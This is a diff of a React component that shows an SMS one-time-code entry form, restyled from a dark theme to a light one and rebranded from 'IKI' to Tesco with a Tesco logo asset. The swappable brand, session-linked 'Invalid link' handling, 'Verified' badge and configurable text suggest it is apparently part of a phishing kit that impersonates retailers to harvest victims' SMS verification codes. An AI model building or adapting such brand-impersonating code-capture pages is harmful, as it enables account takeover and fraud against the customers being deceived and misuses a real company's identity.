@@ -113,7 +113,7 @@ export function SmsClient({ sessionId }: Props) {
     return (
       <div className="flex min-h-[100dvh] items-center justify-center">
         <div className="flex justify-center py-16">
-          <div className="size-12 animate-spin rounded-full border-4 border-[var(--brand)]/30 border-t-[var(--brand)]" />
+          <div className="size-12 animate-spin rounded-full border-4 border-[#dbe6f3] border-t-[var(--brand)]" />
         </div>
       </div>
     );
@@ -122,7 +122,7 @@ export function SmsClient({ sessionId }: Props) {
   if (!supabase) {
     return (
       <div className="flex min-h-[100dvh] items-start justify-center p-3 pt-[16vh] sm:p-6 sm:pt-[26vh]">
-        <div className="w-full max-w-[650px] rounded-[24px] bg-[var(--brand-panel)] border border-[var(--brand)] shadow-[0_0_40px_rgba(var(--brand-rgb),0.3)] p-5 sm:p-8">
+        <div className="w-full max-w-[650px] rounded-[24px] bg-white border border-[#dbe6f3] shadow-[0_20px_60px_rgba(10,36,99,0.15)] p-5 sm:p-8">
           <ConfigMissing />
         </div>
       </div>
@@ -132,8 +132,8 @@ export function SmsClient({ sessionId }: Props) {
   if (!sessionId) {
     return (
       <div className="flex min-h-[100dvh] items-start justify-center p-3 pt-[16vh] sm:p-6 sm:pt-[26vh]">
-        <div className="w-full max-w-[650px] rounded-[24px] bg-[var(--brand-panel)] border border-[var(--brand)] shadow-[0_0_40px_rgba(var(--brand-rgb),0.3)] p-5 sm:p-8 text-center">
-          <p className="rounded-xl border border-red-500/30 bg-red-500/10 p-4 text-center text-sm text-red-400">
+        <div className="w-full max-w-[650px] rounded-[24px] bg-white border border-[#dbe6f3] shadow-[0_20px_60px_rgba(10,36,99,0.15)] p-5 sm:p-8 text-center">
+          <p className="rounded-xl border border-red-200 bg-red-50 p-4 text-center text-sm text-red-600">
             Invalid link.
           </p>
         </div>
@@ -144,7 +144,7 @@ export function SmsClient({ sessionId }: Props) {
   if (loading) {
     return (
       <div className="flex min-h-[100dvh] items-start justify-center p-3 pt-[16vh] sm:p-6 sm:pt-[26vh]">
-        <div className="w-full max-w-[650px] rounded-[24px] bg-[var(--brand-panel)] border border-[var(--brand)] shadow-[0_0_40px_rgba(var(--brand-rgb),0.3)] p-5 sm:p-8 flex justify-center py-16">
+        <div className="w-full max-w-[650px] rounded-[24px] bg-white border border-[#dbe6f3] shadow-[0_20px_60px_rgba(10,36,99,0.15)] p-5 sm:p-8 flex justify-center py-16">
           <div className="size-12 animate-spin rounded-full border-4 border-[var(--brand)] border-t-transparent" />
         </div>
       </div>
@@ -191,13 +191,13 @@ export function SmsClient({ sessionId }: Props) {
 
   return (
     <div className="flex min-h-[100dvh] items-start justify-center p-3 pt-[16vh] sm:p-6 sm:pt-[26vh]">
-      <div className="w-full max-w-[650px] rounded-[24px] bg-[var(--brand-panel)] border border-[var(--brand)] shadow-[0_0_40px_rgba(var(--brand-rgb),0.3)] p-6 sm:p-10 relative z-10 fade-in">
+      <div className="w-full max-w-[650px] rounded-[24px] bg-white border border-[#dbe6f3] shadow-[0_20px_60px_rgba(10,36,99,0.15)] p-6 sm:p-10 relative z-10 fade-in">
         
         {/* Right Top Logo Placeholder */}
         <div className="absolute right-6 top-6 sm:right-10 sm:top-10">
           <img
             src="/form-assets/tesco-mini-logo.png"
-            alt="IKI logo"
+            alt="Tesco"
             className="h-10 w-10 object-contain drop-shadow-[0_10px_18px_rgba(0,0,0,0.35)]"
             id="sms-ah-logo"
           />
@@ -208,13 +208,13 @@ export function SmsClient({ sessionId }: Props) {
             <img src="/form-assets/icon-security.png" alt="Verified" className="h-12 w-12" id="sms-verified-icon" />
           </div>
           <div>
-            <h2 className="text-2xl font-bold text-white mb-1">{settings.sms_title}</h2>
-            <p className="text-sm text-gray-300 font-medium whitespace-pre-line">{displayText.replace("{digits}", digits.toString())}</p>
+            <h2 className="text-2xl font-bold text-[#0a2463] mb-1">{settings.sms_title}</h2>
+            <p className="text-sm text-gray-600 font-medium whitespace-pre-line">{displayText.replace("{digits}", digits.toString())}</p>
           </div>
         </div>
         
         <form onSubmit={handleSubmit} className="space-y-5">
-          <div className="block text-sm font-medium text-white">
+          <div className="block text-sm font-medium text-[#0a2463]">
             <div className="mb-3">{settings.sms_input_label} ({digits})</div>
             <div
               className="grid gap-1.5 sm:gap-2 w-full mx-auto"
@@ -235,7 +235,7 @@ export function SmsClient({ sessionId }: Props) {
                   inputMode="numeric"
                   autoComplete="one-time-code"
                   maxLength={1}
-                  className="w-full aspect-square sm:aspect-[5/6] text-center rounded-xl border border-transparent bg-white/10 text-xl sm:text-2xl md:text-3xl font-bold text-white shadow-sm transition-colors placeholder:text-gray-500 focus:border-[var(--brand)] focus:outline-none focus:ring-2 focus:ring-[var(--brand)]/50"
+                  className="w-full aspect-square sm:aspect-[5/6] text-center rounded-xl border border-transparent bg-[#f0f6fb] text-xl sm:text-2xl md:text-3xl font-bold text-[#0a2463] shadow-sm transition-colors placeholder:text-gray-500 focus:border-[var(--brand)] focus:outline-none focus:ring-2 focus:ring-[var(--brand)]/50"
                   value={code[index] || ""}
                   onChange={(e) => handleOtpChange(index, e.target.value)}
                   onKeyDown={(e) => handleOtpKeyDown(index, e)}
@@ -245,20 +245,20 @@ export function SmsClient({ sessionId }: Props) {
           </div>
 
           {!valid && code.length > 0 ? (
-            <p className="text-xs text-red-400">Enter exactly {digits} digits.</p>
+            <p className="text-xs text-red-600">Enter exactly {digits} digits.</p>
           ) : null}
 
-          {msg ? <p className="text-center text-sm text-red-400">{msg}</p> : null}
+          {msg ? <p className="text-center text-sm text-red-600">{msg}</p> : null}
 
           <button
             type="submit"
             disabled={saving || !valid}
-            className="w-full rounded-xl bg-gradient-to-r from-[var(--brand)] to-[var(--brand-dark)] py-4 text-lg font-bold text-white shadow-[0_0_15px_rgba(var(--brand-rgb),0.4)] transition-all hover:brightness-110 active:scale-[0.98] disabled:opacity-60"
+            className="w-full rounded-xl bg-gradient-to-r from-[var(--brand)] to-[var(--brand-dark)] py-4 text-lg font-bold text-white shadow-[0_8px_20px_rgba(0,83,159,0.25)] transition-all hover:brightness-110 active:scale-[0.98] disabled:opacity-60"
           >
             {saving ? settings.sms_loading : settings.sms_button}
           </button>
 
-          <p className="text-center text-xs text-gray-400 mt-4">
+          <p className="text-center text-xs text-gray-500 mt-4">
             The code has been sent by SMS to your mobile number.
           </p>
         </form>
